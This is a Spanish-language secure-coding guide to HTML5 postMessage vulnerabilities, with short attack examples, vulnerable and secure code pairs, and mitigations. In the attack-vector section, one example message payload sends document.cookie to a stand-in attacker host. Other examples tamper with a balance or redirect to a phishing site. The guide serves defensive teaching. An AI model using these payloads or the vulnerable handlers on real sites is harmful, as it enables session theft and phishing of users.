# HTML5 postMessage Vulnerability

## Descripción

La vulnerabilidad de HTML5 postMessage ocurre cuando una aplicación web implementa la API `window.postMessage()` de forma insegura, sin validar adecuadamente el origen de los mensajes recibidos o enviando mensajes a cualquier origen (`*`). Esto puede permitir que un atacante realice acciones no autorizadas, acceda a información sensible o ejecute código malicioso en el contexto de la aplicación vulnerable.

## Concepto

La API postMessage es un mecanismo proporcionado por HTML5 para permitir la comunicación segura entre ventanas o iframes, incluso cuando estos tienen diferentes orígenes. Está diseñada para superar las restricciones de la política del mismo origen (Same-Origin Policy) de forma controlada.

El problema de seguridad surge cuando los desarrolladores:
1. No verifican el origen (`event.origin`) de los mensajes recibidos
2. Usan `'*'` como destino al enviar mensajes, permitiendo que cualquier origen los reciba
3. No validan o sanitizan adecuadamente el contenido de los mensajes antes de procesarlos

## Vectores de Ataque

### 1. Ataques de inyección a través de mensajes

Un atacante puede enviar mensajes con estructuras o valores maliciosos que, al ser procesados sin validación, pueden provocar comportamientos no deseados:

```javascript
// Desde un iframe controlado por el atacante
window.parent.postMessage({
  action: 'executeAction',
  command: 'document.location="https://malicious-site.com?cookie="+document.cookie'
}, '*');
```

### 2. Robo de información sensible

Si la aplicación envía datos sensibles a través de postMessage sin verificar el destino:

```javascript
// Código vulnerable en la aplicación
window.postMessage({ 
  userInfo: { 
    name: 'Usuario', 
    apiKey: 'secret-api-key-123' 
  } 
}, '*');

// Atacante puede capturar esta información desde cualquier iframe o ventana
```

### 3. Manipulación del estado de la aplicación

Un atacante puede enviar mensajes que modifican el estado interno de la aplicación:

```javascript
// Mensaje malicioso para modificar un saldo
window.parent.postMessage({
  action: 'updateBalance',
  newBalance: 999999
}, '*');
```

### 4. Phishing y redirecciones

```javascript
// Mensaje malicioso que provoca una redirección
window.parent.postMessage({
  action: 'navigate',
  url: 'https://phishing-site.com'
}, '*');
```

## Impacto

- **Robo de información sensible**: Tokens de sesión, datos personales, claves API
- **Ejecución de JavaScript malicioso**: Similar a XSS, pero bypaseando algunas protecciones
- **Manipulación del DOM**: Modificación de elementos visuales o funcionales
- **Evasión de restricciones de CSP**: En algunos casos, esta vulnerabilidad puede ayudar a evadir políticas de CSP
- **Ataques de phishing**: Redirección a sitios maliciosos o modificación de la interfaz

## Implementación Vulnerable vs. Segura

### Envío de Mensajes

#### Vulnerable
```javascript
// Enviar a cualquier origen (inseguro)
window.postMessage(data, '*');
```

#### Seguro
```javascript
// Enviar solo a un origen específico
window.postMessage(data, 'https://trusted-domain.com');
```

### Recepción de Mensajes

#### Vulnerable
```javascript
// No verifica el origen
window.addEventListener('message', function(event) {
  // Procesar event.data directamente
  processMessage(event.data);
});
```

#### Seguro
```javascript
// Verifica el origen antes de procesar
window.addEventListener('message', function(event) {
  // Lista de orígenes permitidos
  const allowedOrigins = ['https://trusted-domain.com', 'https://api.myapp.com'];
  
  // Verificar si el origen está permitido
  if (!allowedOrigins.includes(event.origin)) {
    console.error('Mensaje recibido de origen no permitido:', event.origin);
    return;
  }
  
  // Validar estructura y tipo de datos
  if (typeof event.data === 'object' && event.data !== null) {
    // Procesar de forma segura
    processValidatedMessage(event.data);
  }
});
```

## Validación del Contenido

### Vulnerable
```javascript
window.addEventListener('message', function(event) {
  // Procesar directamente sin validación de estructura
  if (event.data.action === 'updateDOM') {
    document.getElementById('content').innerHTML = event.data.html;
  }
});
```

### Seguro
```javascript
window.addEventListener('message', function(event) {
  if (event.origin !== 'https://trusted-domain.com') return;
  
  // Validar estructura y tipo
  if (typeof event.data !== 'object' || !event.data) return;
  
  // Validar acción específica
  if (event.data.action === 'updateDOM') {
    // Sanitizar HTML antes de insertar
    const sanitizedHTML = DOMPurify.sanitize(event.data.html);
    document.getElementById('content').innerHTML = sanitizedHTML;
  }
});
```

## Mitigaciones

### 1. Verificación estricta del origen

Siempre validar `event.origin` contra una lista de orígenes permitidos.

```javascript
const trustedOrigins = [
  'https://trusted1.com',
  'https://api.myapp.com'
];

if (!trustedOrigins.includes(event.origin)) {
  return; // Ignorar mensajes de orígenes no confiables
}
```

### 2. Especificar origen al enviar mensajes

Nunca usar `'*'` como destino al enviar mensajes.

```javascript
// En lugar de:
iframe.contentWindow.postMessage(data, '*');

// Usar:
iframe.contentWindow.postMessage(data, 'https://trusted-app.com');
```

### 3. Validación de estructura y tipo

Validar rigurosamente la estructura y tipo de los datos recibidos.

```javascript
if (typeof event.data !== 'object' || event.data === null) {
  return; // Ignorar datos con formato incorrecto
}

// Validar propiedades esperadas
if (!event.data.hasOwnProperty('action') || typeof event.data.action !== 'string') {
  return;
}
```

### 4. Sanitización de contenido

Si se debe procesar HTML o código recibido por postMessage, sanitizarlo adecuadamente.

```javascript
import DOMPurify from 'dompurify';

// Sanitizar HTML recibido
const sanitizedContent = DOMPurify.sanitize(event.data.htmlContent);
```

### 5. Usar tokens de autenticación

Para mensajes críticos, implementar un sistema de tokens para verificar la autenticidad.

```javascript
// Al enviar
const token = generateSecureToken();
iframe.contentWindow.postMessage({ data: data, token: token }, targetOrigin);

// Al recibir
if (!validateToken(event.data.token)) {
  return; // Rechazar mensaje con token inválido
}
```

## Herramientas de Detección

- **Análisis de código estático**: Buscar patrones como `postMessage('*')` o ausencia de verificaciones de `event.origin`
- **Pruebas dinámicas**: Frameworks como OWASP ZAP o herramientas personalizadas para probar la validación de origen
- **Revisiones de código**: Revisar específicamente la implementación de comunicaciones entre ventanas

## Referencias

1. [MDN Web Docs: Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
2. [OWASP: HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
3. [PortSwigger: DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
4. [Google: postMessage Security](https://research.google/pubs/pub42934/)
5. [HackTricks: postMessage Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities)